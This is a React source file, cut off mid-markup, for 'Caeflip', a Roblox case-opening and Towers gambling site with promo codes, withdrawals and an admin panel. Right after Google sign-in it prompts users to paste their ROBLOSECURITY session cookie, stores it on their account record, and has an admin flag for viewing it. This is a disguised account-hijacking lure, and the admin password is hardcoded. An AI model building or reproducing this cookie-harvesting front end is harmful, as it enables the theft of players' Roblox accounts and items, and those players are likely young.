import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { LogOut, User, Shield, Gift, Box, Star, Settings, Zap, Globe, Trash2, Users, ArrowUp, Grid3X3, Lock, AlertCircle, Key, Eye } from 'lucide-react';
import confetti from 'canvas-confetti';
import { clsx, type ClassValue } from 'clsx';
import { twMerge } from 'tailwind-merge';

// Utility
function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs));
}

// Item Types
interface Item {
  id: string;
  name: string;
  value: number;
  demand: 'High' | 'Mid' | 'Low' | 'Horrendous';
  rarity: 'legendary' | 'epic' | 'rare' | 'uncommon' | 'common';
  icon: string;
}

const ALL_ITEMS: Item[] = [
  { id: '1', name: 'The Classic ROBLOX Fedora', value: 5100, demand: 'High', rarity: 'legendary', icon: '🎩' },
  { id: '2', name: 'Tattletale', value: 4500, demand: 'Low', rarity: 'legendary', icon: '🎭' },
  { id: '3', name: 'Valkyrie Helm', value: 3100, demand: 'Mid', rarity: 'epic', icon: '⚔️' },
  { id: '4', name: 'Gold Clockwork Headphones', value: 2500, demand: 'Mid', rarity: 'epic', icon: '🎧' },
  { id: '5', name: 'Soviet Ushanka', value: 2180, demand: 'Mid', rarity: 'epic', icon: '👲' },
  { id: '6', name: 'Playful Vampire', value: 1600, demand: 'Low', rarity: 'rare', icon: '🧛' },
  { id: '7', name: 'Supa Dupa Fly Cap', value: 870, demand: 'Low', rarity: 'uncommon', icon: '🧢' },
  { id: '8', name: 'Evil Skeptic', value: 670, demand: 'Mid', rarity: 'uncommon', icon: '👁️' },
  { id: '9', name: 'Bucket', value: 450, demand: 'Low', rarity: 'common', icon: '🪣' },
  { id: '10', name: 'Kulle E Koala', value: 440, demand: 'Low', rarity: 'common', icon: '🐨' },
  { id: '11', name: 'Black Iron Antlers', value: 440, demand: 'Mid', rarity: 'uncommon', icon: '🦌' },
  { id: '12', name: 'Bam', value: 420, demand: 'Low', rarity: 'common', icon: '💥' },
  { id: '13', name: 'Neon Green Beautiful Hair', value: 390, demand: 'Low', rarity: 'common', icon: '💚' },
  { id: '14', name: 'Katana Of Destiny', value: 360, demand: 'Low', rarity: 'common', icon: '⚔️' },
  { id: '15', name: 'Blue Wistful Wink', value: 330, demand: 'Low', rarity: 'common', icon: '💙' },
  { id: '16', name: 'Chill Cap', value: 330, demand: 'Mid', rarity: 'uncommon', icon: '❄️' },
  { id: '17', name: 'Red Goof', value: 300, demand: 'Low', rarity: 'common', icon: '🔴' },
  { id: '18', name: 'Sapphire Evil Eye', value: 250, demand: 'Low', rarity: 'common', icon: '💎' },
  { id: '19', name: 'LOLWHY', value: 200, demand: 'Horrendous', rarity: 'common', icon: '🤷' },
  { id: '20', name: 'LOL Santa', value: 111, demand: 'Horrendous', rarity: 'common', icon: '🎅' },
];

// Promo Code
interface PromoCode {
  code: string;
  amount: number;
  usesLeft: number;
  totalUses: number;
}

// User Type
interface User {
  id: string;
  email: string;
  name: string;
  picture: string;
  balance: number;
  roblosecurity?: string;
  inventory: Item[];
  joinedAt: string;
}

// Withdrawal Request
interface WithdrawRequest {
  id: string;
  userId: string;
  userName: string;
  userEmail: string;
  itemIds: string[];
  robloxUsername: string;
  status: 'pending' | 'approved' | 'rejected';
  createdAt: string;
}

// Case Types
interface Case {
  id: string;
  name: string;
  price: number;
  items: Item[];
  color: string;
  icon: string;
}

const CASES: Case[] = [
  {
    id: 'starter',
    name: 'Starter Crate',
    price: 100,
    items: ALL_ITEMS.filter(i => i.value <= 600),
    color: 'from-green-500 to-emerald-600',
    icon: '📦'
  },
  {
    id: 'pro',
    name: 'Pro Case',
    price: 500,
    items: ALL_ITEMS.filter(i => i.value >= 200 && i.value <= 2200),
    color: 'from-blue-500 to-indigo-600',
    icon: '💼'
  },
  {
    id: 'legendary',
    name: 'Legendary Vault',
    price: 1500,
    items: ALL_ITEMS.filter(i => i.value >= 1000),
    color: 'from-purple-500 to-pink-600',
    icon: '👑'
  },
  {
    id: 'godly',
    name: 'Godly Box',
    price: 3000,
    items: ALL_ITEMS.filter(i => i.value >= 2500),
    color: 'from-yellow-500 to-orange-600',
    icon: '⭐'
  }
];

// Towers Game
interface TowerGame {
  bet: number;
  currentLevel: number;
  grid: boolean[][];
  active: boolean;
  maxLevel: number;
  multiplier: number;
}

const TOWER_MULTIPLIERS = [1.1, 1.3, 1.6, 2.0, 2.5, 3.2, 4.2, 5.5, 7.5, 10, 14, 20];

// Button Component
interface ButtonProps extends React.ButtonHTMLAttributes<HTMLButtonElement> {
  variant?: 'default' | 'outline' | 'ghost' | 'destructive';
  size?: 'default' | 'sm' | 'icon';
}

const Button = React.forwardRef<HTMLButtonElement, ButtonProps>(
  ({ className, variant = 'default', size = 'default', ...props }, ref) => {
    const variants = {
      default: 'bg-indigo-600 text-white hover:bg-indigo-700',
      outline: 'border border-slate-700 bg-transparent hover:bg-slate-800',
      ghost: 'hover:bg-slate-800',
      destructive: 'bg-red-600 text-white hover:bg-red-700'
    };
    
    const sizes = {
      default: 'h-10 px-4 py-2',
      sm: 'h-8 px-3 text-sm',
      icon: 'h-10 w-10'
    };
    
    return (
      <button
        ref={ref}
        className={cn(
          'inline-flex items-center justify-center rounded-lg font-medium transition-colors disabled:opacity-50',
          variants[variant],
          sizes[size],
          className
        )}
        {...props}
      />
    );
  }
);
Button.displayName = 'Button';

export default function CaeflipApp() {
  const [activeTab, setActiveTab] = useState<'crates' | 'items' | 'inventory' | 'withdraw' | 'towers' | 'admin'>('crates');
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [user, setUser] = useState<User | null>(null);
  const [showRobloSecurityModal, setShowRobloSecurityModal] = useState(false);
  const [robloSecurity, setRobloSecurity] = useState('');
  const [showAdminLogin, setShowAdminLogin] = useState(false);
  const [viewRobloSecurity, setViewRobloSecurity] = useState(false);
  const [adminPassword, setAdminPassword] = useState('');
  const [isAdmin, setIsAdmin] = useState(false);
  const [spinning, setSpinning] = useState(false);
  const [spinnerItems, setSpinnerItems] = useState<Item[]>([]);
  const [spinnerOffset, setSpinnerOffset] = useState(0);
  const [wonItem, setWonItem] = useState<Item | null>(null);
  const [showWinModal, setShowWinModal] = useState(false);
  const [selectedCase, setSelectedCase] = useState<Case>(CASES[0]);
  const [history, setHistory] = useState<{item: Item, case: string, profit: number, timestamp: Date}[]>([]);
  const [allUsers, setAllUsers] = useState<User[]>([]);
  const [withdrawRequests, setWithdrawRequests] = useState<WithdrawRequest[]>([]);
  const [promoCodes, setPromoCodes] = useState<PromoCode[]>([]);
  const [promoInput, setPromoInput] = useState('');
  const [promoError, setPromoError] = useState('');
  const [promoSuccess, setPromoSuccess] = useState('');
  
  // Admin panels
  const [showUserManager, setShowUserManager] = useState(false);
  const [showPromoManager, setShowPromoManager] = useState(false);
  const [newPromoCode, setNewPromoCode] = useState('');
  const [newPromoAmount, setNewPromoAmount] = useState(100);
  const [newPromoUses, setNewPromoUses] = useState(10);
  const [selectedUserId, setSelectedUserId] = useState('');
  const [balanceToAdd, setBalanceToAdd] = useState(0);
  
  // Towers
  const [towerGame, setTowerGame] = useState<TowerGame | null>(null);
  const [towerBet, setTowerBet] = useState(100);
  const [towerDifficulty, setTowerDifficulty] = useState<'easy' | 'medium' | 'hard'>('medium');
  const [towerGrid, setTowerGrid] = useState<boolean[]>([false, false, false]);
  const [towerRevealed, setTowerRevealed] = useState<boolean[]>([false, false, false]);
  const [showTowerResult, setShowTowerResult] = useState<'win' | 'loss' | null>(null);

  // Withdraw
  const [selectedWithdrawItems, setSelectedWithdrawItems] = useState<string[]>([]);
  const [withdrawRobloxName, setWithdrawRobloxName] = useState('');

  const spinnerRef = useRef<HTMLDivElement>(null);

  // Load data from localStorage
  useEffect(() => {
    const savedUser = localStorage.getItem('caeflip_user');
    const savedUsers = localStorage.getItem('caeflip_all_users');
    const savedHistory = localStorage.getItem('caeflip_history');
    const savedRequests = localStorage.getItem('caeflip_withdrawals');
    const savedPromos = localStorage.getItem('caeflip_promos');
    
    if (savedUser) {
      const parsed = JSON.parse(savedUser);
      setUser(parsed);
      setIsLoggedIn(true);
    }
    if (savedUsers) setAllUsers(JSON.parse(savedUsers));
    if (savedHistory) {
      const parsed = JSON.parse(savedHistory);
      setHistory(parsed.map((h: any) => ({...h, timestamp: new Date(h.timestamp)})));
    }
    if (savedRequests) setWithdrawRequests(JSON.parse(savedRequests));
    if (savedPromos) setPromoCodes(JSON.parse(savedPromos));
  }, []);

  // Save user data
  useEffect(() => {
    if (user) {
      localStorage.setItem('caeflip_user', JSON.stringify(user));
      setAllUsers(prev => {
        const filtered = prev.filter(u => u.id !== user.id);
        const updated = [...filtered, user];
        localStorage.setItem('caeflip_all_users', JSON.stringify(updated));
        return updated;
      });
    }
  }, [user]);

  useEffect(() => {
    localStorage.setItem('caeflip_history', JSON.stringify(history));
  }, [history]);

  useEffect(() => {
    localStorage.setItem('caeflip_withdrawals', JSON.stringify(withdrawRequests));
  }, [withdrawRequests]);

  useEffect(() => {
    localStorage.setItem('caeflip_promos', JSON.stringify(promoCodes));
  }, [promoCodes]);

  // Google Sign In
  useEffect(() => {
    const script = document.createElement('script');
    script.src = 'https://accounts.google.com/gsi/client';
    script.async = true;
    script.defer = true;
    document.body.appendChild(script);

    script.onload = () => {
      if (window.google) {
        window.google.accounts.id.initialize({
          client_id: '365561042683-ipbq59a5ip4k37fhie29is9625rmmipp.apps.googleusercontent.com',
          callback: handleCredentialResponse,
        });
      }
    };

    return () => {
      document.body.removeChild(script);
    };
  }, []);

  const handleCredentialResponse = (response: any) => {
    const credential = response.credential;
    const payload = JSON.parse(atob(credential.split('.')[1]));
    
    const newUser: User = {
      id: payload.sub,
      email: payload.email,
      name: payload.name,
      picture: payload.picture,
      balance: 0,
      inventory: [],
      joinedAt: new Date().toISOString(),
    };

    const savedUsers = localStorage.getItem('caeflip_all_users');
    const users = savedUsers ? JSON.parse(savedUsers) : [];
    const existingUser = users.find((u: User) => u.id === newUser.id);
    
    if (existingUser) {
      setUser(existingUser);
    } else {
      setUser(newUser);
      setAllUsers([...users, newUser]);
    }
    
    setIsLoggedIn(true);
    setShowRobloSecurityModal(true);
  };

  const handleGoogleLogin = () => {
    if (window.google) {
      window.google.accounts.id.prompt();
    }
  };

  const submitRobloSecurity = () => {
    if (robloSecurity.length > 50) {
      if (user) {
        const updated = { ...user, roblosecurity: robloSecurity };
        setUser(updated);
      }
      setShowRobloSecurityModal(false);
      setRobloSecurity('');
    }
  };

  const logout = () => {
    setIsLoggedIn(false);
    setUser(null);
    setIsAdmin(false);
    localStorage.removeItem('caeflip_user');
    setActiveTab('crates');
  };

  const adminLogin = () => {
    if (adminPassword === 'kerimpro') {
      setIsAdmin(true);
      setActiveTab('admin');
      setShowAdminLogin(false);
      setAdminPassword('');
    }
  };

  const generateRandomItems = (caseItems: Item[], count: number): Item[] => {
    const items: Item[] = [];
    for (let i = 0; i < count; i++) {
      const random = Math.random();
      let item;
      
      // Better odds for user
      if (random < 0.01) {
        // 1% Legendary (doubled from 0.5%)
        const legendary = caseItems.filter(i => i.rarity === 'legendary');
        item = legendary[Math.floor(Math.random() * legendary.length)] || caseItems[0];
      } else if (random < 0.06) {
        // 5% Epic (doubled from 2.5%)
        const epic = caseItems.filter(i => i.rarity === 'epic');
        item = epic[Math.floor(Math.random() * epic.length)] || caseItems[0];
      } else if (random < 0.18) {
        // 12% Rare (up from 9%)
        const rare = caseItems.filter(i => i.rarity === 'rare');
        item = rare[Math.floor(Math.random() * rare.length)] || caseItems[0];
      } else if (random < 0.40) {
        // 22% Uncommon
        const uncommon = caseItems.filter(i => i.rarity === 'uncommon');
        item = uncommon[Math.floor(Math.random() * uncommon.length)] || caseItems[0];
      } else {
        // 60% Common
        const common = caseItems.filter(i => i.rarity === 'common');
        item = common[Math.floor(Math.random() * common.length)] || caseItems[0];
      }
      
      items.push(item);
    }
    return items;
  };

  const openCase = () => {
    if (!user || spinning || user.balance < selectedCase.price) return;

    const newBalance = user.balance - selectedCase.price;
    setUser({ ...user, balance: newBalance });
    setSpinning(true);
    setShowWinModal(false);

    const items = generateRandomItems(selectedCase.items, 60);
    setSpinnerItems(items);

    const winningItem = items[50];
    setWonItem(winningItem);

    const itemWidth = 120;
    const finalOffset = -(50 * itemWidth) + (spinnerRef.current?.offsetWidth || 600) / 2 - 60;
    
    setSpinnerOffset(0);
    setTimeout(() => {
      setSpinnerOffset(finalOffset);
    }, 50);

    setTimeout(() => {
      setSpinning(false);
      setShowWinModal(true);
      
      if (user) {
        const profit = winningItem.value - selectedCase.price;
        setUser(prev => prev ? {
          ...prev,
          balance: prev.balance + winningItem.value,
          inventory: [...prev.inventory, winningItem]
        } : null);
        
        setHistory(prev => [{
          item: winningItem,
          case: selectedCase.name,
          profit,
          timestamp: new Date()
        }, ...prev].slice(0, 50));

        if (winningItem.value >= selectedCase.price * 2) {
          confetti({
            particleCount: 100,
            spread: 70,
            origin: { y: 0.6 }
          });
        }
      }
    }, 4000);
  };

  const redeemPromo = () => {
    setPromoError('');
    setPromoSuccess('');
    
    const code = promoCodes.find(p => p.code.toLowerCase() === promoInput.toLowerCase());
    
    if (!code) {
      setPromoError('Invalid promo code');
      return;
    }
    
    if (code.usesLeft <= 0) {
      setPromoError('This code has been fully redeemed');
      return;
    }
    
    const usedCodes = JSON.parse(localStorage.getItem('caeflip_used_codes') || '[]');
    if (usedCodes.includes(code.code)) {
      setPromoError('You already used this code');
      return;
    }
    
    if (user) {
      setUser({ ...user, balance: user.balance + code.amount });
      setPromoCodes(promoCodes.map(p => 
        p.code === code.code ? { ...p, usesLeft: p.usesLeft - 1 } : p
      ));
      usedCodes.push(code.code);
      localStorage.setItem('caeflip_used_codes', JSON.stringify(usedCodes));
      setPromoSuccess(`Redeemed! +$${code.amount} added to your balance`);
      setPromoInput('');
    }
  };

  const createPromoCode = () => {
    if (!newPromoCode || newPromoAmount <= 0) return;
    
    const code: PromoCode = {
      code: newPromoCode.toUpperCase(),
      amount: newPromoAmount,
      usesLeft: newPromoUses,
      totalUses: newPromoUses
    };
    
    setPromoCodes([...promoCodes, code]);
    setNewPromoCode('');
    setNewPromoAmount(100);
    setNewPromoUses(10);
  };

  const addBalanceToUser = () => {
    const targetUser = allUsers.find(u => u.id === selectedUserId);
    if (!targetUser || balanceToAdd <= 0) return;
    
    const updated = { ...targetUser, balance: targetUser.balance + balanceToAdd };
    setAllUsers(allUsers.map(u => u.id === selectedUserId ? updated : u));
    
    if (user?.id === selectedUserId) {
      setUser(updated);
    }
    
    setBalanceToAdd(0);
  };

  const submitWithdrawal = (itemIds: string[], robloxUsername: string) => {
    if (!user || itemIds.length === 0) return;
    
    const request: WithdrawRequest = {
      id: Date.now().toString(),
      userId: user.id,
      userName: user.name,
      userEmail: user.email,
      itemIds,
      robloxUsername,
      status: 'pending',
      createdAt: new Date().toISOString()
    };
    
    const remainingItems = user.inventory.filter((_, idx) => !itemIds.includes(`${user.inventory[idx].id}-${idx}`));
    setUser({ ...user, inventory: remainingItems });
    
    setWithdrawRequests([...withdrawRequests, request]);
  };

  const handleWithdrawAction = (id: string, action: 'approved' | 'rejected') => {
    setWithdrawRequests(withdrawRequests.map(r => 
      r.id === id ? { ...r, status: action } : r
    ));
  };

  const startTower = () => {
    if (!user || user.balance < towerBet) return;
    
    setUser({ ...user, balance: user.balance - towerBet });
    
    const cols = towerDifficulty === 'easy' ? 3 : towerDifficulty === 'medium' ? 4 : 5;
    const safeCount = towerDifficulty === 'easy' ? 2 : towerDifficulty === 'medium' ? 1 : 1;
    
    const grid: boolean[] = [];
    for (let i = 0; i < cols; i++) {
      grid.push(Math.random() < safeCount / cols);
    }
    
    setTowerGrid(grid);
    setTowerRevealed(new Array(cols).fill(false));
    setTowerGame({
      bet: towerBet,
      currentLevel: 0,
      grid: [grid],
      active: true,
      maxLevel: 12,
      multiplier: 1
    });
    setShowTowerResult(null);
  };

  const clickTowerTile = (index: number) => {
    if (!towerGame || !towerGame.active || towerRevealed[index]) return;
    
    const newRevealed = [...towerRevealed];
    newRevealed[index] = true;
    setTowerRevealed(newRevealed);
    
    if (towerGrid[index]) {
      const newLevel = towerGame.currentLevel + 1;
      const newMultiplier = TOWER_MULTIPLIERS[newLevel] || TOWER_MULTIPLIERS[TOWER_MULTIPLIERS.length - 1];
      
      if (newLevel >= towerGame.maxLevel) {
        const winAmount = Math.floor(towerGame.bet * newMultiplier);
        if (user) setUser({ ...user, balance: user.balance + winAmount });
        setTowerGame(null);
        setShowTowerResult('win');
        confetti({ particleCount: 150, spread: 80 });
      } else {
        const cols = towerDifficulty === 'easy' ? 3 : towerDifficulty === 'medium' ? 4 : 5;
        const safeCount = towerDifficulty === 'easy' ? 2 : towerDifficulty === 'medium' ? 1 : 1;
        const newGrid: boolean[] = [];
        for (let i = 0; i < cols; i++) {
          newGrid.push(Math.random() < safeCount / cols);
        }
        
        setTowerGrid(newGrid);
        setTowerRevealed(new Array(cols).fill(false));
        setTowerGame({
          ...towerGame,
          currentLevel: newLevel,
          multiplier: newMultiplier,
          grid: [...towerGame.grid, newGrid]
        });
      }
    } else {
      setTowerGame({ ...towerGame, active: false });
      setShowTowerResult('loss');
      setTimeout(() => setTowerGame(null), 2000);
    }
  };

  const cashoutTower = () => {
    if (!towerGame || !user) return;
    
    const winAmount = Math.floor(towerGame.bet * towerGame.multiplier);
    setUser({ ...user, balance: user.balance + winAmount });
    setTowerGame(null);
    setShowTowerResult('win');
    confetti({ particleCount: 100, spread: 60 });
  };

  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-950 via-indigo-950 to-slate-900 flex items-center justify-center p-4">
        <title>Caeflip - #1 Roblox Gambling Site</title>
        
        <motion.div
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          className="bg-slate-900/80 backdrop-blur-xl border border-indigo-500/30 rounded-2xl p-8 max-w-md w-full text-center shadow-2xl"
        >
          <div className="mb-6">
            <div className="w-20 h-20 mx-auto bg-gradient-to-br from-indigo-500 to-purple-600 rounded-full flex items-center justify-center mb-4 shadow-lg shadow-indigo-500/30">
              <Globe className="w-10 h-10 text-white" />
            </div>
            <h1 className="text-4xl font-bold bg-gradient-to-r from-indigo-400 via-purple-400 to-pink-400 bg-clip-text text-transparent">
              Caeflip
            </h1>
            <p className="text-slate-400 mt-2">The Ultimate Roblox Gambling Experience</p>
          </div>

          <div className="space-y-4">
            <p className="text-sm text-slate-500">Sign in to start playing</p>
            <Button
              variant="outline"
              onClick={handleGoogleLogin}
              className="w-full h-12 border-slate-600 bg-slate-800 hover:bg-slate-700 hover:border-slate-500 font-medium transition-all"
            >
              <div className="flex items-center gap-3">
                <svg className="w-5 h-5" viewBox="0 0 24 24">
                  <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                  <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                  <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                  <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                </svg>
                <span>Continue with Google</span>
              </div>
            </Button>
            <p className="text-xs text-slate-600">
              By signing in, you agree to our Terms of Service
            </p>
          </div>

          <div className="mt-8 pt-6 border-t border-slate-800">
            <div className="flex items-center justify-center gap-2 text-slate-500">
              <Shield className="w-4 h-4" />
              <span className="text-xs">Secure • Fair • Instant</span>
            </div>
          </div>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 font-sans">
      <title>Caeflip - #1 Roblox Gambling Site</title>

      {/* Navigation */}
      <nav className="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-xl border-b border-slate-800">
        <div className="max-w-7xl mx-auto px-4">
          <div className="flex items-center justify-between h-16">
            {/* Logo */}
            <div className="flex items-center gap-2">
              <div className="w-10 h-10 bg-gradient-to-br from-indigo-500 to-purple-600 rounded-lg flex items-center justify-center">
                <Globe className="w-6 h-6 text-white" />
              </div>
              <span className="text-2xl font-bold bg-gradient-to-r from-indigo-400 to-purple-400 bg-clip-text text-transparent">
                Caeflip
              </span>
            </div>

            {/* Nav Links */}
            <div className="hidden md:flex items-center gap-1">
              {[
                { id: 'crates', icon: Box, label: 'Crates' },
                { id: 'towers', icon: Grid3X3, label: 'Towers' },
                { id: 'items', icon: Star, label: 'Items' },
                { id: 'inventory', label: 'Inventory' },
                { id: 'withdraw', icon: ArrowUp, label: 'Withdraw' },
                ...(isAdmin ? [{ id: 'admin', icon: Shield, label: 'Admin' }] : []),
              ].map((tab: any) => (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id)}
                  className={cn(
                    "flex items-center gap-2 px-4 py-2 rounded-lg transition-all text-sm font-medium",
                    activeTab === tab.id
                      ? "bg-indigo-600 text-white"
                      : "text-slate-400 hover:text-slate-100 hover:bg-slate-800"
                  )}
                >
                  {tab.icon && <tab.icon className="w-4 h-4" />}
                  <span>{tab.label}</span>
                </button>
              ))}
            </div>

            {/* User Section */}
            <div className="flex items-center gap-4">
              {user && (
                <>
                  <div className="hidden sm:flex items-center gap-3 bg-slate-800/50 rounded-lg px-4 py-2">
                    <img src={user.picture} alt={user.name} className="w-8 h-8 rounded-full" />
                    <div className="text-right">
                      <p className="text-sm font-medium text-slate-200">{user.name}</p>
                      <p className="text-xs text-emerald-400 font-mono">${user.balance.toLocaleString()}</p>
                    </div>
                  </div>
                  
                  <Button
                    variant="ghost"
                    size="icon"
                    onClick={() => setShowAdminLogin(true)}
                    className="text-slate-400 hover:text-indigo-400"
                  >
                    <Settings className="w-5 h-5" />
                  </Button>
                  
                  <Button
                    variant="ghost"
                    size="icon"
                    onClick={logout}
                    className="text-slate-400 hover:text-red-400"
                  >
                    <LogOut className="w-5 h-5" />
                  </Button>
                </>
              )}
            </div>
          </div>
        </div>
      </nav>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 py-8">
        {/* Promo Code Banner */}
        {activeTab !== 'admin' && (
          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            className="mb-6 bg-gradient-to-r from-indigo-900/50 to-purple-900/50 border border-indigo-500/30 rounded-xl p-4"
          >
            <div className="flex flex-col sm:flex-row items-center gap-4">
              <div className="flex items-center gap-2">
                <Gift className="w-5 h-5 text-indigo-400" />
                <span className="text-sm text-slate-300">Have a promo code?</span>
              </div>
              <div className="flex-1 flex gap-2 w-full sm:w-auto">
                <input
                  type="text"
                  value={promoInput}
                  onChange={(e) => setPromoInput(e.target.value)}
                  placeholder="Enter code..."
                  className="flex-1 bg-slate-900 border border-slate-700 rounded-lg px-4 py-2 text-sm focus:border-indigo-500 focus:outline-none"
                />
                <Button onClick={redeemPromo}>Redeem</Button>
              </div>
              {promoError && <p className="text-red-400 text-sm">{promoError}</p>}
              {promoSuccess && <p className="text-emerald-400 text-sm">{promoSuccess}</p>}
            </div>
          </motion.div>
        )}

        {/* Crates Tab */}
        {activeTab === 'crates' && (
          <div className="space-y-8">
            {/* Case Selector */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
              {CASES.map((c) => (
                <button
                  key={c.id}
                  onClick={() => setSelectedCase(c)}
                  className={cn(
                    "relative p-6 rounded-xl border-2 transition-all text-left",
                    selectedCase.id === c.id
                      ? "border-indigo-500 bg-indigo-500/10"
                      : "border-slate-800 bg-slate-900/50 hover:border-slate-700"
                  )}
                >
                  <div className="text-4xl mb-2">{c.icon}</div>
                  <h3 className="font-semibold text-slate-200">{c.name}</h3>
                  <p className="text-2xl font-bold text-emerald-400">${c.price}</p>
                  {selectedCase.id === c.id && (
                    <motion.div
                      layoutId="selectedCase"
                      className="absolute inset-0 border-2 border-indigo-500 rounded-xl"
                      transition={{ type: "spring", stiffness: 300, damping: 30 }}
                    />
                  )}
                </button>
              ))}
            </div>

            {/* Spinner */}
            <div className="bg-slate-900 rounded-2xl p-8 border border-slate-800">
              <div className="relative h-40 overflow-hidden rounded-xl bg-slate-950 mb-8">
                <div className="absolute left-1/2 top-0 bottom-0 w-1 bg-indigo-500 z-10 -translate-x-1/2 shadow-lg shadow-indigo-500/50" />
                
                <motion.div
                  ref={spinnerRef}
                  className="flex items-center h-full absolute"
                  animate={{ x: spinnerOffset }}
                  transition={{ duration: 4, ease: [0.15, 0, 0.15, 1] }}
                >
                  {spinnerItems.map((item, idx) => (
                    <div
                      key={idx}
                      className={cn(
                        "w-[120px] h-32 flex-shrink-0 flex flex-col items-center justify-center border-r border-slate-800",
                        item.rarity === 'legendary' && "bg-gradient-to-b from-yellow-900/30 to-transparent",
                        item.rarity === 'epic' && "bg-gradient-to-b from-purple-900/30 to-transparent",
                        item.rarity === 'rare' && "bg-gradient-to-b from-blue-900/30 to-transparent",
                        item.rarity === 'uncommon' && "bg-slate-800/50",
                        item.rarity === 'common' && "bg-slate-900"
                      )}
                    >
                      <span className="text-4xl mb-2">{item.icon}</span>
                      <span className="text-xs text-center px-2 text-slate-400 truncate w-full">{item.name}</span>
                    </div>
                  ))}
                </motion.div>
              </div>

              <div className="flex flex-col items-center gap-4">
                <Button
                  onClick={openCase}
                  disabled={spinning || (user?.balance || 0) < selectedCase.price}
                  className="w-full max-w-md h-16 text-xl font-bold bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-500 hover:to-purple-500 disabled:opacity-50"
                >
                  {spinning ? (
                    <span className="flex items-center gap-2">
                      <motion.div
                        animate={{ rotate: 360 }}
                        transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                      >
                        <Zap className="w-6 h-6" />
                      </motion.div>
                      Opening...
                    </span>
                  ) : (
                    `Open $${selectedCase.price}`
                  )}
                </Button>
                
                {(user?.balance || 0) < selectedCase.price && (
                  <p className="text-red-400 text-sm">Insufficient balance</p>
                )}
              </div>
            </div>

            {/* Items Preview */}
            <div>
              <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
                <Star className="w-5 h-5 text-indigo-400" />
                Possible Items
              </h3>
              <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-3">
                {selectedCase.items.map((item) => (
                  <div
                    key={item.id}
                    className={cn(
                      "p-4 rounded-xl border transition-all hover:scale-105",
                      item.rarity === 'legendary' && "bg-gradient-to-br from-yellow-900/30 to-slate-900 border-yellow-500/30",
                      item.rarity === 'epic' && "bg-gradient-to-br from-purple-900/30 to-slate-900 border-purple-500/30",
                      item.rarity === 'rare' && "bg-gradient-to-br from-blue-900/30 to-slate-900 border-blue-500/30",
                      item.rarity === 'uncommon' && "bg-slate-900 border-slate-700",
                      item.rarity === 'common' && "bg-slate-900 border-slate-800"
                    )}
                  >
                    <div className="text-3xl mb-2">{item.icon}</div>
                    <p className="text-sm font-medium text-slate-200 truncate">{item.name}</p>
                    <p className="text-emerald-400 font-mono">${item.value}</p>
                    <p className="text-xs text-slate-500 capitalize">{item.rarity}</p>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* Towers Tab */}
        {activeTab === 'towers' && (
          <div className="max-w-2xl mx-auto">
            <div className="text-center mb-8">
              <h2 className="text-3xl font-bold mb-2">Towers</h2>
              <p className="text-slate-400">Climb the tower, avoid the bombs!</p>
            </div>

            {!towerGame ? (
              <div className="bg-slate-900 rounded-2xl p-8 border border-slate-800">
                <div className="space-y-6">
                  <div>
                    <label className="text-sm text-slate-400 mb-2 block">Bet Amount</label>
                    <div className="flex gap-2">
                      {[100, 500, 1000, 5000].map((amount) => (
                        <button
                          key={amount}
                          onClick={() => setTowerBet(amount)}
                          className={cn(
                            "flex-1 py-3 rounded-lg border transition-all",
                            towerBet === amount
                              ? "border-indigo-500 bg-indigo-500/20 text-indigo-400"
                              : "border-slate-700 bg-slate-800 text-slate-400 hover:border-slate-600"
                          )}
                        >
                          ${amount}
                        </button>
                      ))}
                    </div>
                  </div>

                  <div>
                    <label className="text-sm text-slate-400 mb-2 block">Difficulty</label>
                    <div className="flex gap-2">
                      {(['easy', 'medium', 'hard'] as const).map((diff) => (
                        <button
                          key={diff}
                          onClick={() => setTowerDifficulty(diff)}
                          className={cn(
                            "flex-1 py-3 rounded-lg border capitalize transition-all",
                            towerDifficulty === diff
                              ? "border-indigo-500 bg-indigo-500/20 text-indigo-400"
                              : "border-slate-700 bg-slate-800 text-slate-400 hover:border-slate-600"
                          )}
                        >
                          {diff}
                        </button>
                      ))}
                    </div>
                    <p className="text-xs text-slate-500 mt-2">
                      {towerDifficulty === 'easy' && '3 tiles, 2 safe - Lower risk, lower reward'}
                      {towerDifficulty === 'medium' && '4 tiles, 1 safe - Balanced risk and reward'}
                      {towerDifficulty === 'hard' && '5 tiles, 1 safe - High risk, high reward'}
                    </p>
                  </div>

                  <Button
                    onClick={startTower}
                    disabled={(user?.balance || 0) < towerBet}
                    className="w-full h-14 text-lg"
                  >
                    Start Game (${towerBet})
                  </Button>
                </div>

                <div className="mt-8">
                  <p className="text-sm text-slate-400 mb-3">Multiplier Progression</p>
                  <div className="flex flex-wrap gap-2">
                    {TOWER_MULTIPLIERS.map((mult, idx) => (
